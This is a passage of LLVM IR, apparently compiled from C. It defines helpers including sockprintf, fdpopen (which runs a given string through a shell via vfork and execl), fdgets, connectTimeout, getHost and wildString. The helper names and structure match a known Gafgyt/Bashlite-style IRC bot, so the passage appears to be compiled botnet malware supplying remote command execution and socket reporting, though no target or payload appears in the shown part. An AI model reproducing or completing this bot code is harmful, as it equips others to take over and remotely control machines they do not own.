  store i32 %56, i32* %18, align 4
  %57 = load i32, i32* %18, align 4
  %58 = icmp sge i32 %57, 10
  br i1 %58, label %59, label %65

; <label>:59:                                     ; preds = %53
  %60 = load i32, i32* %15, align 4
  %61 = sub nsw i32 %60, 48
  %62 = sub nsw i32 %61, 10
  %63 = load i32, i32* %18, align 4
  %64 = add nsw i32 %63, %62
  store i32 %64, i32* %18, align 4
  br label %65

; <label>:65:                                     ; preds = %59, %53
  %66 = load i32, i32* %18, align 4
  %67 = add nsw i32 %66, 48
  %68 = trunc i32 %67 to i8
  %69 = load i8*, i8** %17, align 8
  %70 = getelementptr inbounds i8, i8* %69, i32 -1
  store i8* %70, i8** %17, align 8
  store i8 %68, i8* %70, align 1
  %71 = load i32, i32* %11, align 4
  %72 = load i32, i32* %21, align 4
  %73 = udiv i32 %72, %71
  store i32 %73, i32* %21, align 4
  br label %50

; <label>:74:                                     ; preds = %50
  %75 = load i32, i32* %19, align 4
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %77, label %94

; <label>:77:                                     ; preds = %74
  %78 = load i32, i32* %13, align 4
  %79 = icmp ne i32 %78, 0
  br i1 %79, label %80, label %90

; <label>:80:                                     ; preds = %77
  %81 = load i32, i32* %14, align 4
  %82 = and i32 %81, 2
  %83 = icmp ne i32 %82, 0
  br i1 %83, label %84, label %90

; <label>:84:                                     ; preds = %80
  %85 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %85, i32 45)
  %86 = load i32, i32* %20, align 4
  %87 = add nsw i32 %86, 1
  store i32 %87, i32* %20, align 4
  %88 = load i32, i32* %13, align 4
  %89 = add nsw i32 %88, -1
  store i32 %89, i32* %13, align 4
  br label %93

; <label>:90:                                     ; preds = %80, %77
  %91 = load i8*, i8** %17, align 8
  %92 = getelementptr inbounds i8, i8* %91, i32 -1
  store i8* %92, i8** %17, align 8
  store i8 45, i8* %92, align 1
  br label %93

; <label>:93:                                     ; preds = %90, %84
  br label %94

; <label>:94:                                     ; preds = %93, %74
  %95 = load i32, i32* %20, align 4
  %96 = load i8**, i8*** %9, align 8
  %97 = load i8*, i8** %17, align 8
  %98 = load i32, i32* %13, align 4
  %99 = load i32, i32* %14, align 4
  %100 = call i32 @prints(i8** %96, i8* %97, i32 %98, i32 %99)
  %101 = add nsw i32 %95, %100
  store i32 %101, i32* %8, align 4
  br label %102

; <label>:102:                                    ; preds = %94, %25
  %103 = load i32, i32* %8, align 4
  ret i32 %103
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #2
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i32, i32* %3, align 4
  %24 = load i8*, i8** %6, align 8
  %25 = load i8*, i8** %6, align 8
  %26 = call i64 @strlen(i8* %25) #10
  %27 = call i64 @send(i32 %23, i8* %24, i64 %26, i32 16384)
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %8, align 4
  %29 = load i8*, i8** %6, align 8
  call void @free(i8* %29) #2
  %30 = load i32, i32* %8, align 4
  ret i32 %30
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  %13 = icmp ne i32 %12, 114
  br i1 %13, label %14, label %19

; <label>:14:                                     ; preds = %2
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  %18 = icmp ne i32 %17, 119
  br i1 %18, label %25, label %19

; <label>:19:                                     ; preds = %14, %2
  %20 = load i8*, i8** %5, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %26

; <label>:25:                                     ; preds = %19, %14
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:26:                                     ; preds = %19
  %27 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %28 = call i32 @pipe(i32* %27) #2
  %29 = icmp slt i32 %28, 0
  br i1 %29, label %30, label %31

; <label>:30:                                     ; preds = %26
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:31:                                     ; preds = %26
  %32 = load i32*, i32** @fdopen_pids, align 8
  %33 = icmp eq i32* %32, null
  br i1 %33, label %34, label %54

; <label>:34:                                     ; preds = %31
  %35 = call i32 @getdtablesize() #2
  store i32 %35, i32* %8, align 4
  %36 = icmp sle i32 %35, 0
  br i1 %36, label %37, label %38

; <label>:37:                                     ; preds = %34
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:38:                                     ; preds = %34
  %39 = load i32, i32* %8, align 4
  %40 = sext i32 %39 to i64
  %41 = mul i64 %40, 4
  %42 = trunc i64 %41 to i32
  %43 = zext i32 %42 to i64
  %44 = call noalias i8* @malloc(i64 %43) #2
  %45 = bitcast i8* %44 to i32*
  store i32* %45, i32** @fdopen_pids, align 8
  %46 = icmp eq i32* %45, null
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %38
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:48:                                     ; preds = %38
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = bitcast i32* %49 to i8*
  %51 = load i32, i32* %8, align 4
  %52 = sext i32 %51 to i64
  %53 = mul i64 %52, 4
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 %53, i32 1, i1 false)
  br label %54

; <label>:54:                                     ; preds = %48, %31
  %55 = call i32 @vfork() #11
  store i32 %55, i32* %9, align 4
  switch i32 %55, label %101 [
    i32 -1, label %56
    i32 0, label %63
  ]

; <label>:56:                                     ; preds = %54
  %57 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %58 = load i32, i32* %57, align 4
  %59 = call i32 @close(i32 %58)
  %60 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %61 = load i32, i32* %60, align 4
  %62 = call i32 @close(i32 %61)
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:63:                                     ; preds = %54
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %66, 114
  br i1 %67, label %68, label %83

; <label>:68:                                     ; preds = %63
  %69 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %70 = load i32, i32* %69, align 4
  %71 = icmp ne i32 %70, 1
  br i1 %71, label %72, label %79

; <label>:72:                                     ; preds = %68
  %73 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %74 = load i32, i32* %73, align 4
  %75 = call i32 @dup2(i32 %74, i32 1) #2
  %76 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %77 = load i32, i32* %76, align 4
  %78 = call i32 @close(i32 %77)
  br label %79

; <label>:79:                                     ; preds = %72, %68
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %81 = load i32, i32* %80, align 4
  %82 = call i32 @close(i32 %81)
  br label %98

; <label>:83:                                     ; preds = %63
  %84 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %85 = load i32, i32* %84, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %87, label %94

; <label>:87:                                     ; preds = %83
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @dup2(i32 %89, i32 0) #2
  %91 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %92 = load i32, i32* %91, align 4
  %93 = call i32 @close(i32 %92)
  br label %94

; <label>:94:                                     ; preds = %87, %83
  %95 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %96 = load i32, i32* %95, align 4
  %97 = call i32 @close(i32 %96)
  br label %98

; <label>:98:                                     ; preds = %94, %79
  %99 = load i8*, i8** %4, align 8
  %100 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.35, i32 0, i32 0), i8* %99, i8* null) #2
  call void @_exit(i32 127) #12
  unreachable

; <label>:101:                                    ; preds = %54
  %102 = load i8*, i8** %5, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 114
  br i1 %105, label %106, label %112

; <label>:106:                                    ; preds = %101
  %107 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %108 = load i32, i32* %107, align 4
  store i32 %108, i32* %6, align 4
  %109 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %110 = load i32, i32* %109, align 4
  %111 = call i32 @close(i32 %110)
  br label %118

; <label>:112:                                    ; preds = %101
  %113 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %114 = load i32, i32* %113, align 4
  store i32 %114, i32* %6, align 4
  %115 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %116 = load i32, i32* %115, align 4
  %117 = call i32 @close(i32 %116)
  br label %118

; <label>:118:                                    ; preds = %112, %106
  %119 = load i32, i32* %9, align 4
  %120 = load i32*, i32** @fdopen_pids, align 8
  %121 = load i32, i32* %6, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i32, i32* %120, i64 %122
  store i32 %119, i32* %123, align 4
  %124 = load i32, i32* %6, align 4
  store i32 %124, i32* %3, align 4
  br label %125

; <label>:125:                                    ; preds = %118, %56, %47, %37, %30, %25
  %126 = load i32, i32* %3, align 4
  ret i32 %126
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #4

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #4

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  %11 = icmp eq i32* %10, null
  br i1 %11, label %19, label %12

; <label>:12:                                     ; preds = %1
  %13 = load i32*, i32** @fdopen_pids, align 8
  %14 = load i32, i32* %3, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i32, i32* %13, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %12, %1
  store i32 -1, i32* %2, align 4
  br label %62

; <label>:20:                                     ; preds = %12
  %21 = load i32, i32* %3, align 4
  %22 = call i32 @close(i32 %21)
  %23 = call i32 @sigemptyset(%struct.__sigset_t* %6) #2
  %24 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #2
  %25 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #2
  %26 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #2
  %27 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #2
  br label %28

; <label>:28:                                     ; preds = %42, %20
  %29 = load i32*, i32** @fdopen_pids, align 8
  %30 = load i32, i32* %3, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i32, i32* %29, i64 %31
  %33 = load i32, i32* %32, align 4
  %34 = call i32 @waitpid(i32 %33, i32* %7, i32 0)
  store i32 %34, i32* %8, align 4
  br label %35

; <label>:35:                                     ; preds = %28
  %36 = load i32, i32* %8, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %42

; <label>:38:                                     ; preds = %35
  %39 = call i32* @__errno_location() #13
  %40 = load i32, i32* %39, align 4
  %41 = icmp eq i32 %40, 4
  br label %42

; <label>:42:                                     ; preds = %38, %35
  %43 = phi i1 [ false, %35 ], [ %41, %38 ]
  br i1 %43, label %28, label %44

; <label>:44:                                     ; preds = %42
  %45 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %46 = load i32*, i32** @fdopen_pids, align 8
  %47 = load i32, i32* %4, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds i32, i32* %46, i64 %48
  store i32 0, i32* %49, align 4
  %50 = load i32, i32* %8, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %44
  br label %60

; <label>:53:                                     ; preds = %44
  %54 = bitcast %struct.in_addr* %9 to i32*
  %55 = load i32, i32* %7, align 4
  store i32 %55, i32* %54, align 4
  %56 = bitcast %struct.in_addr* %9 to i32*
  %57 = load i32, i32* %56, align 4
  %58 = and i32 %57, 65280
  %59 = ashr i32 %58, 8
  br label %60

; <label>:60:                                     ; preds = %53, %52
  %61 = phi i32 [ -1, %52 ], [ %59, %53 ]
  store i32 %61, i32* %2, align 4
  br label %62

; <label>:62:                                     ; preds = %60, %19
  %63 = load i32, i32* %2, align 4
  ret i32 %63
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #4

declare i32 @waitpid(i32, i32*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %27, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* %8, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

; <label>:16:                                     ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %8, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

; <label>:25:                                     ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

; <label>:27:                                     ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %8, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %8, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %8, align 4
  br label %9

; <label>:37:                                     ; preds = %25
  %38 = load i32, i32* %7, align 4
  %39 = icmp eq i32 %38, 0
  br i1 %39, label %40, label %41

; <label>:40:                                     ; preds = %37
  br label %43

; <label>:41:                                     ; preds = %37
  %42 = load i8*, i8** %4, align 8
  br label %43

; <label>:43:                                     ; preds = %41, %40
  %44 = phi i8* [ null, %40 ], [ %42, %41 ]
  ret i8* %44
}

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #13
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %100

; <label>:37:                                     ; preds = %4
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %38, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 8, i32 4, i1 false)
  %40 = load i32, i32* %6, align 4
  %41 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  store i32 %42, i32* %16, align 4
  %43 = load i32, i32* %16, align 4
  %44 = icmp slt i32 %43, 0
  br i1 %44, label %45, label %91

; <label>:45:                                     ; preds = %37
  %46 = call i32* @__errno_location() #13
  %47 = load i32, i32* %46, align 4
  %48 = icmp eq i32 %47, 115
  br i1 %48, label %49, label %89

; <label>:49:                                     ; preds = %45
  %50 = load i32, i32* %9, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %51, i64* %52, align 8
  %53 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %53, align 8
  br label %54

; <label>:54:                                     ; preds = %49
  %55 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %56 = getelementptr inbounds [16 x i64], [16 x i64]* %55, i64 0, i64 0
  %57 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %56) #2, !srcloc !1
  %58 = extractvalue { i64, i64* } %57, 0
  %59 = extractvalue { i64, i64* } %57, 1
  %60 = trunc i64 %58 to i32
  store i32 %60, i32* %17, align 4
  %61 = ptrtoint i64* %59 to i64
  %62 = trunc i64 %61 to i32
  store i32 %62, i32* %18, align 4
  br label %63

; <label>:63:                                     ; preds = %54
  %64 = load i32, i32* %6, align 4
  %65 = srem i32 %64, 64
  %66 = zext i32 %65 to i64
  %67 = shl i64 1, %66
  %68 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %69 = load i32, i32* %6, align 4
  %70 = sdiv i32 %69, 64
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds [16 x i64], [16 x i64]* %68, i64 0, i64 %71
  %73 = load i64, i64* %72, align 8
  %74 = or i64 %73, %67
  store i64 %74, i64* %72, align 8
  %75 = load i32, i32* %6, align 4
  %76 = add nsw i32 %75, 1
  %77 = call i32 @select(i32 %76, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %78 = icmp sgt i32 %77, 0
  br i1 %78, label %79, label %87

; <label>:79:                                     ; preds = %63
  store i32 4, i32* %13, align 4
  %80 = load i32, i32* %6, align 4
  %81 = bitcast i32* %14 to i8*
  %82 = call i32 @getsockopt(i32 %80, i32 1, i32 4, i8* %81, i32* %13) #2
  %83 = load i32, i32* %14, align 4
  %84 = icmp ne i32 %83, 0
  br i1 %84, label %85, label %86

; <label>:85:                                     ; preds = %79
  store i32 0, i32* %5, align 4
  br label %100

; <label>:86:                                     ; preds = %79
  br label %88

; <label>:87:                                     ; preds = %63
  store i32 0, i32* %5, align 4
  br label %100

; <label>:88:                                     ; preds = %86
  br label %90

; <label>:89:                                     ; preds = %45
  store i32 0, i32* %5, align 4
  br label %100

; <label>:90:                                     ; preds = %88
  br label %91

; <label>:91:                                     ; preds = %90, %37
  %92 = load i32, i32* %6, align 4
  %93 = call i32 (i32, i32, ...) @fcntl(i32 %92, i32 3, i8* null)
  %94 = sext i32 %93 to i64
  store i64 %94, i64* %15, align 8
  %95 = load i64, i64* %15, align 8
  %96 = and i64 %95, -2049
  store i64 %96, i64* %15, align 8
  %97 = load i32, i32* %6, align 4
  %98 = load i64, i64* %15, align 8
  %99 = call i32 (i32, i32, ...) @fcntl(i32 %97, i32 4, i64 %98)
  store i32 1, i32* %5, align 4
  br label %100

; <label>:100:                                    ; preds = %91, %89, %87, %85, %36
  %101 = load i32, i32* %5, align 4
  ret i32 %101
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #2
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #4

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  br label %4

; <label>:4:                                      ; preds = %14, %1
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  br i1 %8, label %9, label %12

; <label>:9:                                      ; preds = %4
  %10 = load i64, i64* %3, align 8
  %11 = icmp sge i64 %10, 0
  br label %12

; <label>:12:                                     ; preds = %9, %4
  %13 = phi i1 [ false, %4 ], [ %11, %9 ]
  br i1 %13, label %14, label %24

; <label>:14:                                     ; preds = %12
  %15 = load i64, i64* %3, align 8
  %16 = shl i64 %15, 4
  %17 = load i8*, i8** %2, align 8
  %18 = getelementptr inbounds i8, i8* %17, i32 1
  store i8* %18, i8** %2, align 8
  %19 = load i8, i8* %17, align 1
  %20 = zext i8 %19 to i64
  %21 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %20
  %22 = load i64, i64* %21, align 8
  %23 = or i64 %16, %22
  store i64 %23, i64* %3, align 8
  br label %4

; <label>:24:                                     ; preds = %12
  %25 = load i64, i64* %3, align 8
  ret i64 %25
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %54 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %37
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %76

; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %33

; <label>:19:                                     ; preds = %13
  %20 = load i8*, i8** %5, align 8
